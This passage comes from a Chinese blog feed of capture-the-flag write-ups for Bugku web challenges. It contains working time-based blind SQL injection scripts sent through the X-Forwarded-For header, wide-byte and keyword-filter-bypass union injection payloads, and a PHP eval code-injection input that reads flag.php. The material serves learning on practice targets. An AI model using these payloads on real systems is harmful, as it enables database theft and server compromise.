class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'table_name:'</span>,table_name)</span><br></pre></td></tr></table></figure><p>这里需要考虑一下服务器有可能自身会延迟，所以我将延迟定在3秒到4秒内</p><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/87.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名：client_ip,flag</p><p>注flag表下的列名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">column_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'column_name:'</span>,column_name)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/88.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为flag</p><p>最后注出flag列下的信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">f = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br></pre></td></tr></table></figure><p>最后的flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/89.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      Bugkuctf-Web
    
    </summary>
    
      <category term="Bugkuctf-Web" scheme="https://Foxgrin.github.io/categories/Bugkuctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-Web(1)</title>
    <link href="https://Foxgrin.github.io//posts/38711/"/>
    <id>https://Foxgrin.github.io//posts/38711/</id>
    <published>2018-07-31T07:58:00.000Z</published>
    <updated>2018-08-02T14:12:55.093Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf中的Web题解(一)<a id="more"></a></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>网址：<a href="http://120.24.86.145:8002/web2/" target="_blank" rel="noopener">http://120.24.86.145:8002/web2/</a></p><p>页面提示听说聪明人都能找到答案，进去页面一堆滑稽表情，看一下源代码，就可以拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h3><p>网址：<a href="http://103.238.227.13:10085/" target="_blank" rel="noopener">http://103.238.227.13:10085/</a></p><p>这是一个文件上传的页面，要求我们上传一个php文件，文件大小不得超过1M</p><p>我们随便上传一个php文件试试</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示上传的不是图片文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们再试着上传一个图片文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>又提示我们不是PHP文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这很明显自相矛盾了，我们再看看提示，一定要上传一个php文件才可能拿到flag</p><p>利用burp分别抓取上传php文件和图片的包</p><p>试着将上传php文件的文件格式修改为图片的文件格式</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>意外发现拿到了flag</p><p>再试着将上传png文件的文件后缀更改为php后缀</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>也同样拿到了flag</p><p>所以猜测这题后台应该首先对文件类型进行检测，如果不是图片的类型，则输出”非图片文件”</p><p>如果是图片类型，再检测文件名，如果是php文件，则输出flag，不是则输出”非php文件”</p><p>因此猜测后台代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">if($_FILES[&apos;file&apos;][&apos;type&apos;] !== &apos;image/png&apos;)&#123;</span><br><span class="line">die(&apos;not png file&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if(!preg_match(&quot;/\.php/&quot;,$_FILES[&apos;file&apos;][&apos;name&apos;]))&#123;</span><br><span class="line">die(&apos;not PHP file&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&apos;flag:xxx&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p>网址：<a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a></p><p>一道计算题，貌似提交正确答案就能获得flag，但是限制了输入文本框的长度，修改源代码的输入长度，输入正确答案，即可得到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h3><p>网址：<a href="http://120.24.86.145:8002/get/" target="_blank" rel="noopener">http://120.24.86.145:8002/get/</a></p><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'what'</span>]))&#123;</span><br><span class="line">        $what = $_GET[<span class="string">'what'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $what;</span><br><span class="line">        <span class="keyword">if</span>($what == <span class="string">'flag'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'flag&#123;***&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器通过GET方式请求，提交给服务器一个what参数，如果值为flag，则输出flag值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h3><p>网址：<a href="http://120.24.86.145:8002/post/" target="_blank" rel="noopener">http://120.24.86.145:8002/post/</a></p><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'what'</span>]))&#123;</span><br><span class="line">         $what = $_GET[<span class="string">'what'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $what;</span><br><span class="line">        <span class="keyword">if</span>($what == <span class="string">'flag'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'flag&#123;***&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器通过POST方式请求，提交给服务器一个what参数，如果值为flag，则输出flag值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://120.24.86.145:8002/post/'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data =&#123;</span><br><span class="line"><span class="string">'what'</span>:<span class="string">'flag'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url,data=data)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">"$what=$_POST['what'];&lt;br&gt;\r\necho $what;&lt;br&gt;\r\nif($what=='flag')&lt;br&gt;\r\necho 'flag&#123;****&#125;';&lt;br&gt;\r\n\r\n\r\nflagflag&#123;bugku_get_ssseint67se&#125;"</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>网址：<a href="http://120.24.86.145:8002/get/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8002/get/index1.php</a></p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">        $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($num))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $num;</span><br><span class="line">            <span class="keyword">if</span>($num == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET请求向服务器提交的参数num值不能是单纯由数字组成的字符串，且参数num值必须等于1，才能拿到flag，看似前后自相矛盾，但是php是门弱类型语言，字符串与数字进行比较时，会截取字符串的前面数字部分与整形数字进行比较，例如我们输入参数num值为1a，会截取a前面的1作为整形与整形1比较，所以输入1a即可拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>网址：<a href="http://120.24.86.145:8002/web3/" target="_blank" rel="noopener">http://120.24.86.145:8002/web3/</a></p><p>一直不停地弹窗，直接查看源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现一串加密的东西，拿去html解码</p><p>得到KEY{J2sa42ahJK-HS11III}</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>网址：<a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a></p><p>从页面提示来看，注入点是id，是数字型注入</p><p>输入id=0,id=1，返回的都是id为1的key值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入id=1’，id=1”,都没有报错，依然都返回id=1的结果，查看一些源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现编码方式是gbk，猜测可能存在宽字节注入</p><p>输入id=1%df%27</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>出现了报错</p><p>说明了存在宽字节注入，也说明了id被单引号包裹</p><p>有报错，有返回信息，可以考虑用union联合注入</p><p>先爆出查询字段数</p><p>输入id=1%df%27 order by 2 %23，正确返回查询结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入id=1%df%27 order by 3 %23，出现了报错</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以查询字段数为2，那么我们前面已经知道了输入id=2时查询结果为空</p><p>我们先爆库，输入id=2%df%27 union select database(),2%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当前库名为sql5</p><p>再爆当前库下的表名，输入id=2%df%27 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>sql5库下的表名为key,test</p><p>题目又有提示查询的是key表</p><p>那么我们就继续爆key表下的列名，输入id=2%df%27 union select group_concat(column_name),2 from information_schema.columns where table_name=’key’%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里出现了报错，发现是单引号被转义了，因此我们可以将字符串key转化成十六进制</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>得到了key表下的列名为id和string</p><p>那么查询id列和string列的值</p><p>输入id=2%df%27 union select group_concat(id),group_concat(string) from key%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>54f3320dc261f313ba712eb3f13a1f6d 即为flag值</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>根据提示，将 flag.bugku.com 解析到120.24.86.145 就能拿到flag </p><p>在hosts文件最末尾添加一行</p><p>120.24.86.145   flag.bugku.com</p><p>然后在浏览器输入flag.bugku.com，就可以看到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="sql注入1"><a href="#sql注入1" class="headerlink" title="sql注入1"></a>sql注入1</h3><p>网址：<a href="http://103.238.227.13:10087/" target="_blank" rel="noopener">http://103.238.227.13:10087/</a></p><p>页面给出了关键的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$array = <span class="keyword">array</span>(<span class="string">'table'</span>,<span class="string">'union'</span>,<span class="string">'and'</span>,<span class="string">'or'</span>,<span class="string">'load_file'</span>,<span class="string">'create'</span>,<span class="string">'delete'</span>,<span class="string">'select'</span>,<span class="string">'update'</span>,<span class="string">'sleep'</span>,<span class="string">'alter'</span>,<span class="string">'drop'</span>,<span class="string">'truncate'</span>,<span class="string">'from'</span>,<span class="string">'max'</span>,<span class="string">'min'</span>,<span class="string">'order'</span>,<span class="string">'limit'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (substr_count($id, $value) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'包含敏感关键字！'</span>.$value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"</span>;</span><br></pre></td></tr></table></figure><p>过滤了一些注入关键词，但是id又经过了strip_tags函数的处理，这个函数可以过滤html标签</p><p>所以，在过滤的关键词中加入&lt;&gt;即可绕过过滤</p><p>从源代码看注入点是id，没有被引号包裹</p><p>输入id=1’，没有查询结果，也没报错，说明这里没有显示报错信息，不能用报错注入，但依然可以用联合注入</p><p>还是先爆查询字段数，输入id=1 o&lt;&gt;rder by 2%23，正确返回结果</p><p>输入id=1 o&lt;&gt;rder by 3%23,没有返回结果，说明查询字段数为2</p><p>接下来爆库，输入id=2 u&lt;&gt;nion s&lt;&gt;elect database(),2%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当前库名为sql3</p><p>爆sql3库下的表名，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(t&lt;&gt;able_name),2 f&lt;&gt;rom info&lt;&gt;rmation_schema.t&lt;&gt;ables where t&lt;&gt;able_schema=database()%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>sql3库下的表名为hash,key,temp</p><p>爆key表下的列名，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(column_name),2 f&lt;&gt;rom info&lt;&gt;rmation_schema.columns where t&lt;&gt;able_name=’key’%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>hash表的列名为id,hash</p><p>爆id,hash列的值，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(id),group_concat(hash) f&lt;&gt;rom sql3.key%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag：c3d3c17b4ca7f791f85e#$1cc72af274af4adef </p><h3 id="你必须让它停下"><a href="#你必须让它停下" class="headerlink" title="你必须让它停下"></a>你必须让它停下</h3><p>网址：<a href="http://120.24.86.145:8002/web12/" target="_blank" rel="noopener">http://120.24.86.145:8002/web12/</a></p><p>进去页面后发现一直不停地在刷新，看一下源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"JavaScript"</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myrefresh</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">window</span>.location.reload();</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="string">'myrefresh()'</span>,<span class="number">500</span>); </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>这里定义了一个函数myrefresh，语句window.location.reload()作用是刷新一次页面，再用setTimeout方法定时刷新一次页面，我们用burp拦截下每次请求的包，发现每次响应的图片都不一样</p><p>于是用burp的intruder模块发送100次请求报文</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现其中有个响应报文长度比其他都长，查看响应内容，发现flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>网址：<a href="http://120.24.86.145:8003/" target="_blank" rel="noopener">http://120.24.86.145:8003/</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>]; </span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>); </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>REQUEST包含了POST和GET，我们通过提交给服务器一个参数hello，服务器利用eval函数执行hello的值的内容，很明显存在命令执行的漏洞，我们可以通过闭合符号的方法去执行多条命令，将flag.php文件内容读取出来</p><p>我们输入hello=1);print_r(file(‘./flag.php’)</p><p>这样将相当于形成语句eval(“var_dump(hellp=1);print_r(file(‘./flag.php’));”)</p><p>执行了多条命令</p><p>当然也可以直接输入hello=print_r(file(‘./flag.php’))</p><p>都可以读出flag</p><h3 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h3><p>网址：<a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 